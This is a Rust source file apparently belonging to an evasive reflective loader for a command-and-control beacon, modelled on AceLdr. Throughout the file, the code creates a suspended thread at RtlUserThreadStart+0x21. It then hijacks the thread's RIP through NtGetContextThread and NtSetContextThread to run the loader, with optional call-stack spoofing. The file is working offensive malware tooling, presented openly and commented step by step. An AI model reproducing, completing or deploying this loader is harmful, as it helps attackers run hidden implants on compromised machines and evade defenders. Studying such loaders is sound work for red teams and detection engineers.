//! ACE (Asynchronous Code Execution) thread trampoline.
//!
//! This module implements controlled thread creation for running the loader:
//!
//! 1. **Create suspended thread** - Start at RtlUserThreadStart+0x21
//! 2. **Hijack RIP** - Redirect instruction pointer to loader function
//! 3. **Resume execution** - Thread runs loader instead of original target
//! 4. **Wait for completion** - Block until loader finishes
//!
//! # Why ACE?
//!
//! Running the loader in a separate thread provides:
//! - Isolated execution context
//! - Clean call stack (not nested in original entry)
//! - Ability to wait on loader completion
//! - Matches AceLdr's threading model

use {
    crate::loader,
    api::{api::Api, dbg_print, windows::*, NT_SUCCESS},
    core::{ffi::c_void, mem::transmute, ptr::null_mut},
};

/// ACE entry point: creates a suspended thread, redirects RIP to loader, and resumes.
///
/// # Purpose
///
/// This function implements the "ACE" (Asynchronous Code Execution) technique to run
/// the loader in a separate thread. This mirrors AceLdr's threading model and provides:
/// - Isolated execution context for the loader
/// - Clean separation between beacon entry and loader logic
/// - Ability to wait on loader completion
///
/// # Execution Flow
///
/// 1. **Resolve APIs** - Get thread creation/manipulation functions from ntdll/kernel32
/// 2. **Create suspended thread** - Spawn thread at RtlUserThreadStart+0x21 offset
/// 3. **Get thread context** - Retrieve CPU state (registers) via NtGetContextThread
/// 4. **Redirect RIP** - Point instruction pointer to loader() function
/// 5. **Set thread context** - Update CPU state with new RIP via NtSetContextThread
/// 6. **Resume thread** - Start execution via NtResumeThread
/// 7. **Wait for completion** - Block until loader finishes (infinite wait)
///
/// # Arguments
///
/// * `_arg` - Unused parameter (required by thread start signature)
///
/// # Thread Context Manipulation
///
/// The thread is created suspended to allow RIP hijacking before execution:
/// ```text
/// Original RIP: RtlUserThreadStart+0x21 (Windows thread startup)
///      ↓
/// Modified RIP: loader() function address
///      ↓
/// Thread executes: loader() instead of intended start routine
/// ```
///
/// # Safety
///
/// - Creates native threads with manually modified context
/// - Waits indefinitely on thread handle (blocking call)
/// - Assumes loader() completes successfully
#[link_section = ".text$B"]
pub unsafe fn ace(_arg: *mut c_void) {
    let mut api = Api::new();
    #[cfg(feature = "spoof-uwd")]
    api.build_spoof_configs();

    dbg_print!(api, b"[ACE] Started\n\0");

    // Step 1: create the suspended beacon thread
    let mut thread: HANDLE = null_mut();
    if !NT_SUCCESS!(create_beacon_thread(&mut api, &mut thread)) {
        dbg_print!(api, b"[ACE] FAIL: create_beacon_thread\n\0");
        return;
    }
    dbg_print!(api, b"[ACE] Thread created: %p\n\0", thread);

    // Step 2: grab the current thread context so we can patch RIP
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_CONTROL;

    api.ntdll.NtGetContextThread(thread, &mut ctx);

    // Step 3: point RIP at our loader stub
    ctx.Rip = loader as *const () as u64;
    dbg_print!(api, b"[ACE] RIP -> loader: %p\n\0", ctx.Rip as usize);

    api.ntdll.NtSetContextThread(thread, &mut ctx);

    // Step 4: resume the thread so it runs the loader
    api.ntdll.NtResumeThread(thread, null_mut());
    dbg_print!(api, b"[ACE] Thread resumed, waiting\n\0");

    // Step 5: keep Api alive until loader finishes to mirror C lifetime
    api.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
    dbg_print!(api, b"[ACE] Loader completed\n\0");

    // Zero sensitive data on stack (no more Drop impl)
    api.zero();
}

/// Creates a suspended thread starting at RtlUserThreadStart+0x21 offset.
///
/// # Purpose
///
/// Creates a native Windows thread in suspended state with a specific start address
/// inside ntdll's thread initialization routine. The +0x21 offset skips past the
/// initial setup code in RtlUserThreadStart, matching AceLdr's approach.
///
/// # Why RtlUserThreadStart+0x21?
///
/// The offset +0x21 places the start address after the function prologue and initial
/// setup code, allowing clean context manipulation before the thread begins execution.
/// This is a known technique in reflective loaders for controlled thread startup.
///
/// # Arguments
///
/// * `api` - Resolved API structure containing thread creation functions
/// * `thread` - Output parameter receiving the created thread handle
///
/// # Returns
///
/// NTSTATUS code from RtlCreateUserThread (STATUS_SUCCESS on success)
///
/// # Thread Creation Parameters
///
/// - Process: Current process (-1 handle)
/// - Security: Default (NULL descriptor)
/// - Suspended: TRUE (allows context modification before execution)
/// - Stack: Default sizes (0 = system defaults)
/// - Start address: RtlUserThreadStart+0x21 (ntdll internal function)
/// - Parameter: NULL (no startup parameter)
///
/// # Safety
///
/// - Manually calculates function pointer offset (+0x21)
/// - Creates thread with non-standard entry point
/// - Thread remains suspended until caller resumes it
#[link_section = ".text$B"]
unsafe fn create_beacon_thread(api: &mut Api, thread: &mut HANDLE) -> NTSTATUS {
    // Step 1: Calculate start address at RtlUserThreadStart+0x21 (skips prologue)
    let suspended: BOOLEAN = TRUE as _;
    let addr = (api.ntdll.RtlUserThreadStart_ptr as *mut u8).offset(0x21);
    let start_address: PUSER_THREAD_START_ROUTINE = transmute(addr);

    dbg_print!(api, b"[ACE] RtlUserThreadStart+0x21: %p\n\0", addr);

    // Step 2: Create suspended thread with patched entry point
    let status = api.ntdll.RtlCreateUserThread(
        -1isize as HANDLE, // Current process
        null_mut(),        // Default security
        suspended,         // Create suspended for RIP hijack
        0,                 // Stack zero bits
        0,                 // Stack reserved (default)
        0,                 // Stack commit (default)
        start_address,     // RtlUserThreadStart+0x21
        null_mut(),        // Thread parameter
        thread,            // Output handle
        null_mut(),        // Client ID (unused)
    );

    dbg_print!(api, b"[ACE] RtlCreateUserThread: %x\n\0", status);
    status
}
